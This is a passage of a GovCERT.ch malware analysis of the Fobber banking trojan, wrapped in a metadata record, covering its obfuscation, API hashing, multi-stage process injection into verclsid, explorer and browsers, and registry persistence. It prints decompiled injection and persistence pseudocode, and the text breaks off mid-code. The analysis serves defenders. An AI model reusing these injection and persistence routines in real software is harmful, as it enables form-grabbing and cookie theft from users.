{
    "id": "070defcc-ef2f-4d9d-b6cb-ed0bb4906e93",
    "created_at": "2022-10-25T16:48:15.934343Z",
    "updated_at": "2025-03-27T02:05:18.904722Z",
    "deleted_at": null,
    "sha1_hash": "7d057d90b0e84a59c984a0a6efb927dde5a1f875",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-09-08T09:39:41Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 808993,
    "plain_text": "GovCERT.ch TLP WHITE\n\n# Contents\n\n**Fobber Analysis** **1**\n\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n\nCode Decryption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\n\nStack Manipulation Trick / Return address patching . . . . . . . . . . . . . . 6\n\nPosition Independence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\nString Obfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\nIAT Construction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n\nFirst Stage Injection to verclsid.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\nVerclsid shellcode and explorer injection . . . . . . . . . . . . . . . . . . . . . . . . 15\n\nIf low integrity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n\nIf not low integrity and not 64 bits . . . . . . . . . . . . . . . . . . . . . . . . 16\n\nIf nothing worked . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\nExplorer shellcode and browsers injection . . . . . . . . . . . . . . . . . . . . . . . 17\n\nBrowser shellcode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\nHooking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\nMonitor configuration changes . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\nStorage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\nConfiguration Storage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\nCommunication Protocol . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\n\nSend . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\n\nReceive . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\nDGA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\nHTTP Send/Receive function selection . . . . . . . . . . . . . . . . . . . . . . 25\n\n# Fobber Analysis\n\n## Summary\n\n[After reading the Malwarebytes blog post describing Fobber, a new variant of Tinba,](https://blog.malwarebytes.org/intelligence/2015/06/elusive-hanjuan-ek-caught-in-new-malvertising-campaign/)\nwe wanted to have a look at it ourselves.\nFobber uses an interesting and unusual approach to make static analysis harder: we’ll try\nto explain it and give hints on how to recover the original un-encrypted shellcode.\nFurthermore we analysed all injection stages used by the malware and described what kind\n\nFOBBER ANALYSIS 1\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nof shellcode run within each injected code.\nIn the original sample, there was no sign of Man-in-the-Browser (MitB) aiming to steal\nbanking credentials but, since the malware has the capability to update itself, this posibility\ncan be later added by the attackers.\nOn our analysis, apart from the update feature, we only found the form-grabbing / cookiestealing malicious feature.\nAlthough this analysis is pretty comprehensive, this cannot be considerate ultimate, there\nare still pieces of the puzzles missing and possible misinterpretation in it.\n\n## Code Decryption\n\n[Similar to the sample studied in Malwarebytes blog post, the samples we examined do an](https://blog.malwarebytes.org/intelligence/2015/06/elusive-hanjuan-ek-caught-in-new-malvertising-campaign/)\ninitial unpacking stage that involves useless registry activities and long series of JMP chains\nthat look like:\n```\n      sub esp, 0BBFh\n      sub esp, 2D5Ah\n      sub esp, 0FFFFD6BDh\n      sub esp, 1909h\n      add esp, 51F2h\n      add esp, 5A82h\n      jmp loc_40AB51\n      ...\nloc_40AB51: add esp, 4AEFh\n      sub esp, 249Eh\n      sub esp, 5A9h\n      jmp sub_40BE56\n      ...\nsub_40BE56: sub esp, 0CD1Ch\n      sub esp, 0FFFFD389h\n      sub esp, 5814h\n      sub esp, 0FFFF327Ch\n      push edi\n      ...\n\n```\nThese add/sub instructions of constants to the same register, here ESP, that at the end of\nthe chain is actually used (the PUSH instruction requires a correct ESP value), seem to be\ntypical for it. These chains can go over hundreds of instruction until they end, this should\nprobably discourage simple, manual reversing in a debugger. You can also see that these\nchains also confuse IDA about the start of functions. But of course, such behavior is quite\ncommon for initial unpacking stages of malware.\n\nAt some point, most of our samples have finally created a shellcode (we call it this way\nbecause of its memory-independency and lack of IAT) in some allocated memory, to which\nthe code jumps via a similarly crafted register:\n```\n...\nadd esi, 47C3h\nadd esi, 4A94h\n\n```\nFOBBER ANALYSIS 2\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\nsub esi, 6566h\nsub esi, 0FFFF24AAh\njmp esi\n\n```\nThis is where it enters the code of interest we’re examining in more detail now. One of our\nsamples uses a slightly different approach; while it also contains above code sequence, it’s\nnever actually executed, but instead a new thread is started at some point, whose starting\npoint turns out to be the shellcode without additional obfuscation. The shellcode looks\nidentical to what we’ll describe below.\n\nNote that the shellcode lies in some memory area previously allocated and, as mentioned,\nit’s completely position-independent. Furthermore, no IAT is required, it will actually work\nlike, well, a shellcode. It is also the code that will later on be injected into other processes.\n\nBut, the shellcode is not really unpacked yet. Instead of unpacking all the code at once in\nmemory, Fobber uses a more advanced way to make the analysis quite a challenge.\nfor the major part of the functions, Fobber initiates the following steps:\n\n  - Decrypts the function to be executed\n\n  - Execute the decrypted function\n\n  - Re-encrypts the executed function using a new random key\n\nLet’s see how the decryption function works.\nOn the screenshot below we see OllyDbg pausing just before the decryption function at\n```\n0x009E2592 is getting called. You can also see that the following code (BOUND instruction)\n\n```\ndoesn’t seem to make much sense - it actually is a still encrypted code fragment. Also the\ncode immediately before this call doesn’t seem to make sense - these bytes actually contain\nheader information about the blob size and encryption key of the fragment.\n\n**Note: If you initiate a step-over (F8) at this point, you will loose debugger control or even**\ncrash - simply because this puts a software breakpoint at the following instruction, so the\nfirst instruction byte is overwritten by 0xCC (opcode for INT 3), which is then overwritten\nonce more by the decrypted code; As a consequence, not only the breakpoint is invalidated,\nbut also a wrong byte code may be introduced.\nYou can avoid this by using hardware breakpoints.\n\nThe decryption function will use specific bytes from the header directly preceding this call\nto perform the decryption (the offsets are the same ones as shown in the screenshot):\n\nOffset Description\n\n`- 0xB` Mutex: either 0x21 (free) or 0xC1 (taken) to avoid problems if\nseveral threads try to enter the same code fragment\n\n`- 0xA..0x9` Code length (XOR-ed with a constant). In the example, it’s\n```\n          0xE415\n\n```\n`- 0x8` XOR key for decryption loop, 0x37 in the example\n\nFOBBER ANALYSIS 3\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nOffset Description\n\n`- 0x7` Recursion-count: 0 means that the code fragment is still\nencrypted, higher values mean that the code fragment is already\ndecrypted and entered n times recursively within the owning\nthread. This prevents double-“decryption” if the function is called\nrecursively within the same thread, and ensures re-encryption\nafter the topmost recursion level leaves.\n\n`- 0x6` Not used (probably padding)\n\n`- 0x5..0x1` Call to decrypt function\n`0x0` First byte of encrypted code\n\nIf we want to match these field to the above example code we obtain:\n```\nMutex: 0x21 - no other thread is currently within this function\nKey: 0x37\nSize 0x9c bytes\nEncrypted: 0x0 - we're not within recursion of the function (otherwise, the\n  first call would have set this byte to 1)\n\n```\nThe size is not directly used but it is first XORed with the constant 0x0E489, so 0xE415\n```\n^ 0x0E489 = 0x9C\n\n```\nThe mutex is 0x21 and means that no other thread is currently decrypting or re-encrypting\nthe code (note: parallel execution of the decrypted code is allowed though, the mutex only\nprotects the encryption/decryption itself)\n\n**Note: The mutex values (0x21 and 0xC1) as well as the XOR constant (0xE451) vary from**\nsample to sample. They can’t be used directly in a generic deobfuscator; you must take\nthese values from code or data analysis. The offsets themselves seem to be constant though.\n\nNow let’s have a look at the decryption function in IDA:\n\nFOBBER ANALYSIS 4\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nAt loc_2597, the decryption function waits until the mutex is free (value 0x21). It uses the\nsomehow unusual CMPEXCHG instruction for this purpose. Here the official, slightly shortened\ndescription of this instruction: “Compares the value of AL with the 1st operand. If identical,\n_the 2nd operand is loaded into the 1st operand. Otherwise, the 1st operand is loaded into_\n_AL.”. Of course, the result of the initial compare is available afterwards in the Z flag (which_\nthe code checks in JNZ ...).\n\nNote that AL is initialized by the MOV AX, instruction just before with 0x21 and AH with\n```\n0xC1, and the “1st operand” is our mutex variable, so you can re-read this as “Compares\n\n```\n`0x21 (free) with mutex.` _If identical (i.e. if mutex is free), set mutex to 0xC1 (taken)._\n_Otherwise, the mutex value (i.e. 0xC1) is loaded into AL.” (but as AL is overwritten in_\nboth cases by a MOV AX,, this “otherwise” actually is a no-operation.) This instruction is\ntypical for mutex/semaphore operations as it allows a test (compare) and set (exchange)\noperation depending on the result of the check within a single, non-interruptible instruction\n\n- this way, these 2 steps form one atomic transaction (note: Actually this instruction should\nbe preceeded by a LOCK prefix to be atomic, without it the instruction is interruptible if\nexecuted from different processors; For some reason, this lacks in all our samples, which can\nbe considered as a small bug).\nThe test result is available afterwards in the Z status flag (checked in the JNZ instruction).\nSo, the code loop above waits until the mutex is free, and then sets the mutex to taken in\na non-interruptible way.\n\nThe XADD instruction afterwards is a similar instruction: “Exchanges the operands and\n_loads their sum into the 1st operand.”. This can be translated here to “Increment the -_\n_7th byte (i.e. increase recursion count, also indicating that code is already decrypted) and_\n_store previous recursion count in AX”. Only if the following check of AX (previous value_\nof recursion count) against 0x0 (meaning that code is still encrypted) is successful, the\n\nFOBBER ANALYSIS 5\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\ndecryption continues by pushing the XOR key and the computed size of the code fragment\nto be decrypted.\n\n**Note: This second step looks redundant on first glance because we already have the mutex**\ncheck before. So no other thread can be in the code fragment, right? But of course, a\nfunction could still call itself recursively in a direct or indirect way and, for such cases, it\nmust be prevented that a subsequent recursive call of this function in the same thread tries\nto decrypt it once more.\n\nThe function xor_code on the right side of the above picture performs the actual decryption.\nThis function loops from 0 to size and for each byte code performs the following:\n\n  - XOR the current code byte with the XOR key\n\n  - Compute a new XOR key for the next step by rotating the bits of the XOR key 3\npositions to the right (ROR) and adds 0x53\n\n**Note: The rotation-and-addition values (3 bits to the right and add 0x53) were the same**\nin all samples we examined, but they could vary in other samples.\n\n**Stack Manipulation Trick / Return address patching**\n\nFobber uses a stack manipulation trick to make it harder for decompilers to reconstruct the\ncorrect flow of the program.\nLet’s have a look on how this works:\n\nA normal code fragment without obfuscation would end in a RETN or RETN n instruction. But\nFobber must call a re-encryption function first, and this re-encryption function must also\ninclude the functionality of this RETN/RETN n instruction (so it must do a double-return),\nbecause the final RETN or RETN n would be overwritten by the re-encrypted self otherwise.\nNote that RETN just pops the return address from the stack, while RETN n discards n more\nbytes from the stack afterwards, which is used in the stdcall calling convention (stack\nargument cleanup by the callee).\nSeveral approaches could solve this problem, one way would be to use a JMP instead. Still,\nhow can the decryption function know what RETN instruction to emulate, and what exact\ncode fragment to re-encrypt? Fobber solves this by pushing a dword to the stack containing\nthis information, and then doing a CALL to the re-encryption function.\n\nLet’s follow this in an example with a pushed value 0x0008009C. This argument is split into\na high 16-bit word (0x8) and a low 16-bit word (0x9C).\nThis value is later used to determine how the stack must be manipulated to return at the\ncorrect address and to access the function “crypto-header” to perform re-encryption.\n\n  - The high word 0x8 is the number of bytes of the original function’s parameters (pushed\nby the original caller), in this example 2 DWORD arguments (resulting in 8 bytes).\n\n  - The low word 0x9c is an offset to the beginning of the function, more precisely to\nthe initial call instruction for decryption. Using this offsets allows the re-encryption\nfunction to read and manipulate the “crypto-header” in order to re-encrypt the code.\n\nFOBBER ANALYSIS 6\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nAfter the initial PUSHA instruction of the re-encryption function (which backups all register\nvalues on the stack), the stack looks like this (higher addresses on top, so reversed to\nOllyDbgs display order):\n```\nESP+0x30: arg1 (original argument, pushed by original caller)\nESP+0x2C: arg2 (original argument, pushed by original caller)\nESP+0x28: ret1 (return address to original caller, the re-encryption code will\n  actually return to this one)\nESP+0x24: 0x8009c (argument to re-encryption function); this stack element\n  will be replaced by the stack correction value plus 8 (`0x10` in our\n  sample) in the following code\nESP+0x20: ret2 (return address of re-encryption function inside the original\n  callee; the decryption function subtracts the offset - here `0x9C` - from\n  this address to find the start of the code fragment to be re-encrypted)\nESP+0x00: <0x20 bytes> (pusha)\n\n```\nWhere 0x8 is the distance between arg1 and ret1. arg1 must be overwritten with ret1 at\nthe end of the re-encryption function just before its own RET instruction to make sure to\nreturn to the original caller and to tidy up the stack (stdcall). The following, documented\ndisassembly describes the procedure:\n\nFOBBER ANALYSIS 7\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nThe stack is shrunken back with add esp, [esp+4] letting the stack with just the ret1\nvalue which is then used by the retn call.\n\nSome functions contain more than one such PUSH and CALL <re-encrypt> pairs, just as a\nfunction can also contain more than one RETN/RETN n instruction. So they don’t need to\nbe at the end of the code fragment (this needs to be read from the header data).\n\nYou also see the actual re-encryption code with the mutex and recursion check. XADD now\nis performed with a value of 0xFFFF, which actually decrements the recursion-count. When\nthis count reaches 0, the blob is re-encrypted. The RDTSC instruction actually produces a\nrandom value for the new XOR key, which is also written back into the header for the next\ntime it needs to be decrypted. The actual crypto loop function is the same as above.\n\n**[Note: The above mentioned Malwarebytes blog post calls this method a “ROP gadget” - we](https://blog.malwarebytes.org/intelligence/2015/06/elusive-hanjuan-ek-caught-in-new-malvertising-campaign/)**\nwere a bit reluctant using this term and decided to use the admittedly more boring naming\n“stack manipulation trick”, as ROP (return-oriented programming) is usually used for an\nexploit technique where foreign code fragments in libraries and/or the operating system are\n“glued together” using a chain of return addresses on the stack on systems where no code\non the stack can be executed. So ROP might be misleading in this case, as it’s no exploit\ntechnique, and no foreign code is brought to execution. It is more simply a “dirty” stack\n\nFOBBER ANALYSIS 8\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nmanipulation trick.\n\nWe wrote and used an IDA Python script that depicts these encryption blobs (by detecting\nthe headers), decrypts the contents, NOPs out the no longer needed initial CALL instruction\n(hence you’ll often see 5 leading NOPs in the subsequent screenshots); it then searches all\n```\nPUSH/CALL pairs to the also no longer needed re-encryption function, replaces them by a\n\n```\nsuitable RET n and prepends some NOPs to overwrite the old code. As a consequence, some\nof the following screenshots show some NOPs before RET n instructions.\n\n## Position Independence\n\nAs the Fobber shellcode can appear anywhere in the addressing space of the process, it\nneeds to be completely position independent. To reach this, one register - in all samples we\nexamined this was EBX - is dedicated as a global framepointer (actually the content of EIP\nat some well-defined anchor point within the shellcode). A constant offset is added to this\nvalue as an additional twist. The initialization function, which needs to be called for every\nnew started thread, is simple enough:\n\nSubsequently, operands can use the template [EBX + 0x6ba51f17] in order to access any\naddress within the range of the shellcode. So EBX is used similar to a frame pointer (usually\n```\nEBP), but in the scope of the whole program instead of only one function. Hence we call\n\n```\nit a global framepointer. `[EBX + 0x6ba51f17] for example would refer to the address`\n```\n0x3c720c - 0x6ba52719 + 0x6ba51f17 = 0x3c6a0a.\n\n```\nOf course, these values differ from sample to sample. If the values are known, it is possible\nto replace the operands by direct memory accesses (here 0x3c6a0a) without modifying the\ninstruction length. Our script also makes this modifications, which actually also frees EBX\nfor other purposes.\n\nWhenever Fobber needs to push a pointer to a string or other binary data to the stack\n(usually as an argument to a function), another approach is used:\n```\n  CALL x # push last argument for this call\ny: <data>\nx: PUSH ... # maybe some more arguments for this call\n  CALL fct # Actual function call\n\n```\nOnly the second CALL is a normal one. The first CALL is no real one, it’s actually the same\nas a PUSH of the subsequent address (y) to the stack. This code fragment must actually be\nconsidered as an equivalent to something like:\n```\n  LEA EBX,z # push last argument for this call\n  PUSH EBX\n  <NOPs>\nx: PUSH ... # maybe some more arguments for this call\n  CALL fct # Actual function call\n\n```\nFOBBER ANALYSIS 9\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n  ...\nz: <data>\n\n```\nOf course this standard code would no longer be position-independent, unlike the original\nversion. Our script also tries to detect and fix these situation. EBX can safely used as helper\nregister here as it is no longer required as global framepointer, as explained above. The\ndata is copied into an additional segment (section) of the file in IDA (address z) and the\nembedded bytes (address y) are replaced by NOPs. that’s when you see some NOPs in the\nmiddle of functions in the following screenshots. Big advantage of this is that IDA can\nnow perform a proper stack analysis and doesn’t mix up code and data anymore, as in the\noriginal variant.\n\nIn most (but not all) cases, the actual function finally called is the string de-obfuscation\ncall described in the next section. In some cases (mostly for very short strings), no string\nobfuscation is used.\n\n## String Obfuscation\n\nFobber also obfuscates most of its strings on-the-fly using a simple XOR algorithm. The\nmain string de-obfuscation function looks like:\n```\nesi (copy of a2) points to the encrypted string, while edi (copy of a3) points to the location\n\n```\nwhere the decrypted string should be placed.\nThe first 16-bit word of the obfuscated string contains two parameters used for decryption:\n\n  - Byte 0 (loaded to AL by LODSW and later moved to ECX): size in bytes\n\n  - Byte 1 (loaded to AH by LODSW): key\n\nThese parameters are followed by the encrypted bytes.\n\nWe can simplify the decryption routine to:\n```\nfor all characters x: x = x ^ key ^ size where size is decremented down to 0 with\n\n```\nevery character.\n\nFOBBER ANALYSIS 10\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\n## IAT Construction\n\nFobber construct a special “IAT” table (not following the PE format) in order to perform\nWindows API calls, actually several such “IAT fragments” (one for each DLL) are used.\nEach call to a Windows function uses the template\n```\nCALL [EBX + <offset>] where EBX is the global framepointer explained above and\n<offset> is the IAT entry offset that identify the API to be called.\n\n```\nNow let’s see how Fobber populate its IAT tables. For each DLL it needs to call the\nfunction:\n```\ndecrypted47_constructIATHashTableForDLL(dllBase, 0x6BA51E5F),\n\n```\nwhere the first argument points to a DLL (usually loaded by a LoadLibrary) and the\nsecond one to an one of its “IAT” fragments.\nIn our example, 0x6BA51E5F refers to address 0x3c6952 (0x3c720c - 0x6ba52719 +\n```\n0x6BA51E5F), at this address we see a serie of DWORD pairs, where the first one always\n\n```\ncontains zeroes and the second one contains a hash value:\n```\n003C694E 00000000\n003C6952 00000000 (address of function A)\n003C6956 956DFF9D (name hash of function A)\n003C695A 00000000 (address of function B)\n003C695E 616E3273 (name hash of function B)\n003C6962 00000000 ...\n003C6966 8EE55695 ...\n003C696A 00000000\n003C696E E10F9D77\n003C6972 00000000\n003C6976 8E040082\n003C697A 00000000\n003C697E 596ECEFD\n003C6982 00000000\n.....\n\n```\nThe hash function implements the following algorithm:\n```\nint hash(char *functionName)\n{\n unsigned int nameHash = 0\n do {\n  nameHash = 7 * nameHash + *functionName++;\n } while ( *functionName );\n return (nameHash ^ 0x7D4A4321):\n}\n\n```\nAgain, the constant varies from sample to sample.\n\nThis hash function is applied to every function name of the required DLL (by traversing\nthe export table) until a match is found, and then the 0x0 value in the “IAT” fragment is\nreplaced by the library function’s address.\n\nFOBBER ANALYSIS 11\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nOnce finished, the memory section will looks like the following snippet and each call will\nthen access directly the API address via an offset to the global framepointer EBX.\n```\n003C694E 00000000\n003C6952 7C812851 kernel32.GetVersionExA\n003C6956 956DFF9D\n003C695A 7C830185 kernel32.GetNativeSystemInfo\n003C695E 616E3273\n003C6962 7C814F11 kernel32.IsWow64Process\n003C6966 8EE55695\n003C696A 7C81AAE7 kernel32.GetExitCodeProcess\n003C696E E10F9D77\n003C6972 7C80946C kernel32.CreateFileMappingA\n003C6976 8E040082\n003C697A 7C80B78D kernel32.MapViewOfFile\n003C697E 596ECEFD\n003C6982 7C80B7FC kernel32.UnmapViewOfFile\n\n```\nAs you can see, this format does not follow the usual template of an IAT, where the thunks\n(addresses to API functions or JMPs to these) should be subsequent.\n\n## First Stage Injection to verclsid.exe\n\nAs already outlined by other researchers, Fobber performs multiple-stage injection on different processes.\n\nInitialization:\n\n1. Creates a custom IAT (see IAT Construction)\n2. Creates a file mapping object (shared memory) and writes the first stage shellcode of\n```\n   0x3B1D bytes into it\n\n```\n3. Starts verclsid.exe process in suspended state\n4. Injects a shellcode of 0x84 bytes to the entry point of it (located in EAX register because\nthe new process did not really start yet)\n5. Resumes the process\n6. Waits for the injected shellcode to complete\n7. Exits the process\n\nIf the file object mapping fails or verclsid.exe cannot be started, the malware directly calls\nthe function it tried to inject.\n\nThe injected shellcode looks like this (HexRays pseudocode):\n```\nvoid __noreturn writtenIntoProcess_size_84h()\n{\n int allocAddress;\n int allocAddress2;\n const void *mappedView;\n\n```\nFOBBER ANALYSIS 12\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n allocAddress = VirtualAlloc(0, 15133, 12288, 64);\n if ( allocAddress )\n {\n  allocAddress2 = allocAddress;\n  mappedView = MapViewOfFile(0, 0xF001Fu, 0, 0, 0x3B1Du); // HANDLE is 0\n  if ( mappedView )\n  {\n   qmemcpy((void *)allocAddress2, mappedView, 0x3B1Du);\n   *(_DWORD *)mappedView = 0x77777777;\n   ((void (__stdcall *)(signed int))(allocAddress2 + 0x396B))(2);// Call\n     entry point of injected code (decrypted71_verclsidInjectionEP)\n  }\n }\n ExitProcess(0);\n}\n\n```\nThis code actually opens the previously created file mapping object (shared memory) and\ncopies its code into a newly allocated memory section in verclsid process.\n\nThe MapViewOfFile call may look wrong since the first argument is zero (instead of a valid\n```\nHANDLE to the file mapping object).\n\n```\nBut Fobber will patch this parameter during runtime. This is how the code looks before\nthis patching:\n\nWe see there there is a cross-reference to the location after the push opcode that we can\nfollow back to a code fragment immediately after CreateFileMappingA call was called:\n\nThis actually writes directly into the PUSH instruction (after opcode 0x68) of the fragment\nthat will afterwards be injected into verclsid. So the handle will no longer be 0 when the\ncode is executed.\n\nOnce the shellcode is copied to the new memory region, the shellcode will call the entry-point\nlocated at offset 0x396B.\n\nBefore performing the call, the shellcode sets the value 0x77777777 to the first DWORD of\nthe mapped view.\nThis signals the process who injected into verclsid that everything went well.\n\nHere the code that performs all these steps in Hexrays pseudocode:\n```\nvoid __usercall __noreturn MAIN_EP_decrypted73(int a1@<ecx>, int a2@<ebx>)\n{\n\n```\nFOBBER ANALYSIS 13\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n HANDLE fileMapping; // eax@1\n int *mappedView; // eax@2\n int *mappedView2; // edi@3\n void *fileMapping2; // [sp-4h] [bp-328h]@2\n CONTEXT context; // [sp+0h] [bp-324h]@4\n STARTUPINFO startupInfo; // [sp+2CCh] [bp-58h]@3\n PROCESS_INFORMATION processInfo; // [sp+310h] [bp-14h]@3\n DWORD flOldProtect; // [sp+320h] [bp-4h]@5\n getIP_ebx();\n decrypted18_constructIATHashtableForAll(a2);\n GetModuleFileNameA(0, MyFilename, 0x104u);\n is64 = IsWow64ProcessCall(-1);\n fileMapping = CreateFileMappingA((HANDLE)0xFFFFFFFF,\n   &security_attributes_filemapping, 4u, 0, 0x3B1Du, 0);\n if ( fileMapping )\n {\n  *(_DWORD *)((char *)&loc_3C79F2 + 1) = fileMapping;\n  fileMapping2 = fileMapping;\n  mappedView = (int *)MapViewOfFile(fileMapping, FILE_MAP_ALL_ACCESS, 0, 0,\n    0x3B1Du);\n  if ( mappedView )\n  {\n   qmemcpy(mappedView, &injectionSectionStart_size381Dh, 0x3B1Du);\n   mappedView2 = mappedView;\n   GetStartupInfoA(&startupInfo);\n   if ( CreateProcessA(0, verclsid, 0, 0, 1, CREATE_SUSPENDED, 0, 0,\n     &startupInfo, &processInfo) )\n   {\n    context.ContextFlags = CONTEXT_FULL;\n    if ( GetThreadContext(processInfo.hThread, &context) )// EAX: contains\n      entry point of verclsid.exe (when started in SUSPENDED mode)\n                        // EBX: points to PEB\n    {\n     if ( VirtualProtectEx(processInfo.hProcess, (LPVOID)context.Eax,\n       0x84u, PAGE_EXECUTE_READWRITE, &flOldProtect) )\n     {\n      constructKernel32IATHashTable();\n      if ( WriteProcessMemory(processInfo.hProcess, (LPVOID)context.Eax,\n        writtenIntoProcess_size84h, 0x84u, 0) )\n      {\n       ResumeThread(processInfo.hThread);\n       while ( 1 )\n       {\n        GetExitCodeProcess(processInfo.hProcess, &flOldProtect);\n        if ( flOldProtect != 259 && flOldProtect != 256 )\n         break;\n        if ( *mappedView2 == 0x77777777 )\n\n```\nFOBBER ANALYSIS 14\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n         ExitProcess(0);\n       }\n      }\n     }\n    }\n    TerminateProcess(processInfo.hProcess, 0);\n    CloseHandle(processInfo.hProcess);\n   }\n   UnmapViewOfFile(mappedView2);\n  }\n  CloseHandle(fileMapping2);\n }\n decrypted71_verclsidInjectionEP(0); // Fallback\n}\n\n## Verclsid shellcode and explorer injection\n\n```\nOnce Fobber has injected itself into verclsid.exe, it will continue with its operations:\n\nIt first checks integrity level of the running process. Low integrity level means (for it) that\n[injection will fail (More about integrity levels on MSDN) therefore it take extra care of this](https://msdn.microsoft.com/en-us/library/bb625963.aspx?f=255&MSPPError=-2147217396)\nscenario.\n\n**If low integrity**\n\n  - Establishes persistency via registry key and changes some settings in Firefox and\nInternet Explorer\n```\n  getFilenameBasedOnType(&fobber, 0);\n  CreateDirectoryA(&fobber, 0);\n  CopyFileA(MyFilename, &nemre, 0);\n  // Create auto-start key in CurrentVersion\\Run\n  RegOpenKeyExA(HKEY_CURRENT_USER,\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, 2u, &key);\n  nemreLen = strlen2(&nemre);\n  RegSetValueExA(key, \"Fobber\", 0, 1u, \"%APPDATA%\\Fobber\\nemre.exe\",\n    nemreLen);\n  RegCloseKey(key);\n  RegOpenKeyExA(HKEY_CURRENT_USER, \"Software\\Microsoft\\Internet\n    Explorer\\Main\", 0, 2u, &key);\n  // Set IE run all tabs in a single process (simplify injection?)\n  RegSetValueExA(key, \"TabProcGrowth\", 0, 4u, (const BYTE\n    *)&tabProcGrowthValue1, 4u);\n  RegCloseKey(key);\n  RegOpenKeyExA(HKEY_CURRENT_USER,\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\",\n    0, 2u, &key);\n\n```\nFOBBER ANALYSIS 15\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n  RegSetValueExA(key, \"1609\", 0, 4u, (const BYTE *)&const0, 4u);\n  RegCloseKey(key);\n    // disable spdy ptotocol for FF by writing user.js file\n  ExpandEnvironmentStringsA(\"%APPDATA%\\Mozilla\\Firefox\\\", &firefoxDir,\n    0x104u);\n  lstrcpyA(&profilesIni, &firefoxDir);\n  lstrcatA(&profilesIni, \"profiles.ini\");\n  // ...\n\n```\n  - Query for install date in the registry and volume serial number - these 2 values build\nthe trojan identifier when contacting the C2\n\n  - Load default user agent using ObtainUserAgentString API\n\n  - Perform the first network request, sends the string “EM” to the C2 server with payload\ntype 8. For more information have a look to the Communication Protocol section. This\ncould ask for a privilege escalation exploit to the C2 server.\n\n  - Sleep for 49 days (!)\n\n**If not low integrity and not 64 bits**\n\nIn this case, the malware will inject another shellcode but this time to the explorer.exe\nprocess.\n```\n  decryptString(aShell_traywnd, (_BYTE *)dst);\n  explorerWindow = FindWindowA((LPCSTR)dst, 0);// Search for explorer.exe\n    window handle\n  if ( explorerWindow )\n  {\n   GetWindowThreadProcessId(explorerWindow, &explorerPID);\n   explHdl = decrypted72_openProcessViaNtOpen(0x1F0FFF, explorerPID);//\n     PROCESS_ALL_ACCESS\n   if ( explHdl )\n   {\n    if ( writePayloadAndCreateRemoteThread(\n       (int)explHdl,\n       &inject_14693_offset940_injectedInExplorer,\n       14693,\n       940,\n       initParam + 1) )\n    {\n     ExitProcess(0x100u);\n    }\n   }\n  }\n\n```\nFirstly it finds the window handle of explorer using FindWindowA('Shell_TrayWnd') then\nit resolve the PID of the process using GetWindowThreadProcessId and finally\nit injects the explorer shellcode and start the remote thread.\n\nFOBBER ANALYSIS 16\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\n**If nothing worked**\n\nIt will fallback and jump directly to the explorer shellcode.\n\n## Explorer shellcode and browsers injection\n\nAs is the case for any injection into another process, the injected code initially needs to find\nit’s position in memory and create its custom IAT table.\n\nThen it starts a thread that will try to locate the browser processes and inject the shellcode\nfor the actual working stage into them.\nFor each running process, it will hash the process name and try to compare it against three\npredefined values:\n```\n     processHash = decrypted09_FunctionNameHash(&processName);\n     processIndex = 1;\n     if ( processHash == 0xFC03162D\n      || (processIndex = 2, processHash == 0xB70846FF)\n      || (processIndex = 3, processHash == 0x7FCC96E6) )\n       // 1: iexplorer.exe (0xFC03162D)\n       // 2: firefox.exe (0xB70846FF)\n       // 3: chrome.exe\n     {\n      hProcess = OpenProcess(0x1F0FFFu, 0, pid);\n      if ( hProcess )\n      {\n       v15 = v10;\n       hProcess2 = hProcess;\n       if ( (!is64 || IsWow64ProcessCall((int)hProcess))\n        && (processIndex != 3 ||\n          decrypted32_getIntegrityLevel(hProcess2)) )\n       {\n        memcpy(\n         (char *)injPtrStart_0x2B72_offset27AA_browserInjectionEP,\n         (char *)&os_information_startOfInjectionSize11122,\n         21u);\n        writePayloadAndCreateRemoteThread(\n         (int)hProcess2,\n         (void *)injPtrStart_0x2B72_offset27AA_browserInjectionEP,\n         0x2B72,\n         0x27AA,\n         processIndex); // injection function at\n           0x3c7275\n       }\n       CloseHandle(hProcess2);\n       v10 = v15;\n      }\n     }\n\n```\nFOBBER ANALYSIS 17\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\n```\n}\n\n```\n\nAt this point, the Browser shellcode is running within all running browsers.\n\nLater it starts an event-loop that will receive signals from the browser threads; but before,\nanother thread takes care to “ping” the C2 server periodically:\n```\n while ( 1 )\n {\n  